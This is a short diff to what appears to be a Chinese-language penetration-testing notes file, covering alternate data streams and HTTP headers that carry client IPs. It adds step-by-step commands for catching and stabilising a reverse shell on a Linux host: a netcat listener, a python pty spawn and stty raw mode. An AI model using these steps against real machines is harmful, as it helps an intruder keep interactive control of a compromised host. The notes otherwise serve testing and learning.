@@ -98,4 +98,6 @@ Get-Item -Path file.exe -Stream * 在文件file.exe中查找所有stream ，这�
 
 Http_header 包含IP的参数:X-Forwarded-For,X-Forwarded-Host,X-Client-IP,X-Remote-IP,X-Remote-Addr,X-Host
 
+在linux 主机上建立一个稳定的shell ,第一：nc -lnvp port;第二： python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm;第三:按下ctrl+z键;第四 ：输入  stty raw -echo;fg
+
 
